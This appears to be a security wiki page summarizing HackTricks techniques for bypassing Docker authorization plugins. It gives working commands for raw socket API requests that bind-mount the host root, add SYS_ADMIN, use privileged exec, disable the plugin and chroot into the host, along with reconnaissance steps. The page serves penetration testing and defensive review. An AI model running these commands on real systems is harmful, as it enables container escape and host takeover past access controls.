---
title: "HackTricks — Runtime Authorization Plugins"
tags:
  [container-security, docker, authorization, privilege-escalation, hacktricks]
sources: [hacktricks-authorization-plugins.md]
updated: 2026-05-01
---

# HackTricks — Runtime Authorization Plugins

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

Docker authorization plugins add a policy layer on top of daemon access, but their safety depends entirely on **complete API surface coverage**. A plugin that blocks obvious CLI patterns while leaving raw API endpoints, alternate JSON field shapes, `docker exec`, or plugin-management operations open creates a false sense of restriction.

## Operation

Requests reach the Docker daemon → forwarded to chained authorization plugins → all plugins must allow → request proceeds. The plugin sees: authenticated user, request path, headers, and body (for suitable content types).

## Common Bypass Techniques

### 1. `docker exec` after unprivileged container creation

Policy blocks `--privileged` at creation but allows `exec`:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker exec -it --privileged <container_id> bash
```

### 2. Bind mount via raw API (field shape mismatch)

Some policies only inspect one JSON structure. Try both:

```bash
# Top-level Binds
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create

# HostConfig.Binds
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

### 3. Unchecked capability attribute

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
```

Once `CAP_SYS_ADMIN` is present, many breakout techniques become reachable.

### 4. Disable the plugin

If plugin-management is not blocked:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

## Reconnaissance

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
# Denial error messages often leak the plugin name
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Denial messages that include the plugin name confirm the control layer and reveal the implementation for further bypass research.

## Assessment Note

Use `docker_auth_profiler` to automate checking which API routes and JSON structures the plugin actually permits. Manual review of `HostConfig` fields is essential: `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, `NetworkMode`, namespace-sharing options.

## Related Pages

- [Container Security](../concepts/container-security.md)
- [HackTricks — Runtime API and Daemon Exposure](hacktricks-runtime-api-daemon-exposure.md)
- [Docker](../entities/docker.md)
- [HackTricks](../entities/hacktricks.md)
